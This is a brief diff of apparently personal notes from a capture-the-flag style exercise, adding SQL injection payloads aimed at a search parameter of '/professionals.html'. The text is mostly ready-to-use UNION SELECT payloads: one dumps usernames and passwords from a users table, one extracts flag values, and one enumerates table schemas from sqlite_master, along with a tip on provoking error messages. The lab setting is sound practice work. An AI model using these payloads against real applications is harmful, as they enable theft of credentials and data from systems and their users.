@@ -1,2 +1,10 @@
 /professionals.html?q=" UNION SELECT 1, group_concat(username || ':' || password || '<br>') FROM users--
                       ^^^ won't always be ', also try adding % and other characters to leak error messages !!
+
+
+[*] Dumping values:
+Kitchen\" OR 1=1 UNION SELECT 1, group_concat(flag, ': ****'), 3, 4 FROM flag WHERE flag LIKE 'SKY-%' LIMIT 100 (just enumerated)
+
+[*] - get table names:
+"Kitchen\" OR 1=1 UNION SELECT 1, group_concat (sql, '; '), 3, 4 FROM sqlite_master WHERE type='table'—-"
+
